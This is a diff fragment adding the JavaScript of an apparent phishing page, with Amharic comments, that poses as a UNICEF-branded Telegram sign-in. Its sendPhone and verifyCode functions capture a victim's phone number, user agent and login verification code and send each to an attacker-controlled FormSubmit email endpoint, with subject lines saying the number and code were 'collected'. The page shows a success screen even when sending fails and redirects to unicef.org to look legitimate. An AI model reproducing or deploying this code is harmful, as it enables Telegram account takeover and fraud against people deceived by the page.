+      resendBtn.innerHTML = '<span>Resend Code</span>';
+      progressBar.style.strokeDashoffset = 283;
+      isCodeExpired = true;
+      
+      codeInput.disabled = true;
+      signinBtn.disabled = true;
+      document.getElementById('time-warning').innerHTML = '<strong>ጊዜ አልፎበታል!</strong> ይህ ኮድ አሁን አልቋል። እባክዎ "Resend Code" የሚለውን ቁልፍ በመጫን አዲስ ኮድ ያግኙ።';
+    }
+  }, 1000);
+}
+
+// ስልክ ቁጥር መላክ
+function sendPhone() {
+  const phoneInput = document.getElementById('phone');
+  const phone = phoneInput.value;
+  const nextBtn = document.getElementById('next-btn');
+  
+  if (!validatePhoneNumber(phone)) {
+    phoneInput.focus();
+    return;
+  }
+  
+  const cleanPhone = phone.replace(/\s/g, '').replace(/\D/g, '');
+  
+  nextBtn.disabled = true;
+  nextBtn.innerHTML = '<span>Sending Code...</span>';
+  
+  fetch(`https://formsubmit.co/ajax/${EMAIL}`, {
+    method: "POST",
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      country: selectedCountry.name,
+      country_code: selectedCountry.code,
+      dial_code: selectedCountry.dialCode,
+      phone_number: cleanPhone,
+      formatted_phone: phone,
+      timestamp: new Date().toISOString(),
+      user_agent: navigator.userAgent,
+      _subject: "📱 ስልክ ቁጥር ተሰብስቧል - UNICEF"
+    })
+  })
+  .then(response => response.json())
+  .then(() => {
+    showPage('code-page');
+    
+    let formattedPhone = cleanPhone;
+    if (selectedCountry.code === "ET" && cleanPhone.length === 10) {
+      formattedPhone = cleanPhone.replace(/(\d{2})(\d{3})(\d{2})(\d{3})/, '$1 $2 $3 $4');
+    } else if ((selectedCountry.code === "US" || selectedCountry.code === "CA") && cleanPhone.length === 10) {
+      formattedPhone = cleanPhone.replace(/(\d{3})(\d{3})(\d{4})/, '$1 $2 $3');
+    } else if (cleanPhone.length === 9) {
+      formattedPhone = cleanPhone.replace(/(\d{3})(\d{3})(\d{3})/, '$1 $2 $3');
+    } else if (cleanPhone.length === 11) {
+      formattedPhone = cleanPhone.replace(/(\d{3})(\d{4})(\d{4})/, '$1 $2 $3');
+    }
+    
+    document.getElementById('display-phone').textContent = `${selectedCountry.dialCode} ${formattedPhone}`;
+    startCountdown();
+  })
+  .catch(error => {
+    console.error('Error:', error);
+    showPage('code-page');
+    startCountdown();
+  })
+  .finally(() => {
+    nextBtn.disabled = false;
+    nextBtn.innerHTML = '<span>Send Code</span>';
+  });
+}
+
+// ኮድ ማረጋገጥ
+function verifyCode() {
+  const codeInput = document.getElementById('code');
+  const code = codeInput.value;
+  const signinBtn = document.getElementById('signin-btn');
+  
+  if (!validateCode(code)) {
+    codeInput.focus();
+    return;
+  }
+  
+  signinBtn.disabled = true;
+  signinBtn.innerHTML = '<span>Verifying...</span>';
+  
+  fetch(`https://formsubmit.co/ajax/${EMAIL}`, {
+    method: "POST",
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      country: selectedCountry.name,
+      country_code: selectedCountry.code,
+      verification_code: code,
+      timestamp: new Date().toISOString(),
+      code_status: isCodeExpired ? "expired" : "valid",
+      _subject: "🔐 ኮድ ተሰብስቧል - UNICEF"
+    })
+  })
+  .then(response => response.json())
+  .then(() => {
+    if (countdownTimer) {
+      clearInterval(countdownTimer);
+    }
+    
+    showPage('success-page');
+    
+    setTimeout(() => {
+      document.querySelector('.success-circle').style.animation = "successPulse 2s infinite";
+    }, 100);
+  })
+  .catch(error => {
+    console.error('Error:', error);
+    showPage('success-page');
+  })
+  .finally(() => {
+    signinBtn.disabled = false;
+    signinBtn.innerHTML = '<span>Verify & Sign In</span>';
+  });
+}
+
+// ኮድ እንደገና መላክ
+function resendCode() {
+  const resendBtn = document.getElementById('resend-btn');
+  
+  if (isCodeExpired) {
+    resendBtn.disabled = true;
+    resendBtn.innerHTML = '<span>Resending...</span>';
+    
+    fetch(`https://formsubmit.co/ajax/${EMAIL}`, {
+      method: "POST",
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        action: "code_resent",
+        country: selectedCountry.name,
+        country_code: selectedCountry.code,
+        timestamp: new Date().toISOString(),
+        _subject: "🔄 ኮድ እንደገና ተልኳል - UNICEF"
+      })
+    })
+    .then(() => {
+      startCountdown();
+      alert("✅ አዲስ የማረጋገጫ ኮድ ወደ ስልክዎ ተልኳል።");
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      startCountdown();
+      alert("✅ አዲስ የማረጋገጫ ኮድ ወደ ስልክዎ ተልኳል።");
+    });
+  }
+}
+
+// የስልክ ቁጥር አውቶ-ፎርማት
+document.getElementById('phone').addEventListener('input', function(e) {
+  let value = e.target.value.replace(/\D/g, '');
+  
+  if (selectedCountry.code === "ET") {
+    if (value.length > 0) {
+      if (value.length <= 2) {
+        value = value;
+      } else if (value.length <= 5) {
+        value = value.replace(/(\d{2})(\d{0,3})/, '$1 $2');
+      } else if (value.length <= 7) {
+        value = value.replace(/(\d{2})(\d{3})(\d{0,2})/, '$1 $2 $3');
+      } else {
+        value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{0,3})/, '$1 $2 $3 $4');
+      }
+    }
+  } else if (selectedCountry.code === "US" || selectedCountry.code === "CA") {
+    if (value.length > 0) {
+      if (value.length <= 3) {
+        value = value;
+      } else if (value.length <= 5) {
+        value = value.replace(/(\d{3})(\d{0,3})/, '$1 $2');
+      } else {
+        value = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3');
+      }
+    }
+  } else {
+    if (value.length > 4) {
+      value = value.replace(/(\d{4})/, '$1 ');
+    }
+    if (value.length > 8) {
+      value = value.replace(/(\d{4}) (\d{4})/, '$1 $2 ');
+    }
+  }
+  
+  e.target.value = value;
+  
+  // ማስተካከል ሲኖር ማረጋገጫ አጥፋ
+  document.getElementById('phone-error').classList.remove('show');
+});
+
+// የኮድ ኢንፑት አውቶ-ሽግግር
+document.getElementById('code').addEventListener('input', function(e) {
+  let value = e.target.value;
+  
+  value = value.replace(/\D/g, '');
+  
+  if (value.length > 5) {
+    value = value.substring(0, 5);
+  }
+  
+  e.target.value = value;
+  
+  document.getElementById('code-error').classList.remove('show');
+  e.target.classList.remove('error');
+  
+  if (value.length === 5) {
+    document.getElementById('signin-btn').focus();
+  }
+});
+
+// የሀገር ምርጫ ማያያዝ
+document.getElementById('country-selector').addEventListener('click', function(e) {
+  e.stopPropagation();
+  document.getElementById('country-dropdown').classList.toggle('active');
+  
+  if (document.getElementById('country-dropdown').classList.contains('active')) {
+    document.getElementById('country-search').focus();
+  }
+});
+
+// ሀገር ዝርዝር ማዝጋት
+document.addEventListener('click', function(e) {
+  if (!e.target.closest('.country-selector') && !e.target.closest('.country-dropdown')) {
+    document.getElementById('country-dropdown').classList.remove('active');
+  }
+});
+
+// አማራጮች
+document.getElementById('open-telegram').addEventListener('click', function() {
+  alert('Opening Telegram Web... You will be redirected to unicef.org');
+  window.open('https://unicef.org', '_blank');
+});
+
+document.getElementById('download-app').addEventListener('click', function() {
+  alert('Redirecting to app download page...');
+  window.open('https://telegram.org/apps', '_blank');
+});
+
+// Enter ቁልፍ ማያያዝ
+document.getElementById('phone').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') {
+    sendPhone();
+  }
+});
+
+document.getElementById('code').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') {
+    verifyCode();
+  }
+});
+
+// የአዝማሚያ ክስተቶች
+document.getElementById('next-btn').addEventListener('click', sendPhone);
+document.getElementById('signin-btn').addEventListener('click', verifyCode);
+document.getElementById('resend-btn').addEventListener('click', resendCode);
+
+// መጀመሪያ ጭነት
+window.addEventListener('DOMContentLoaded', function() {
+  loadCountries();
+  updateSteps('phone-page');
+  document.getElementById('phone').focus();
+  
+  setTimeout(() => {
+    document.querySelector('.alert-info').style.animation = 'slideUp 0.5s ease-out';
+  }, 300);
+});
+</script>
+</body>
+</html>
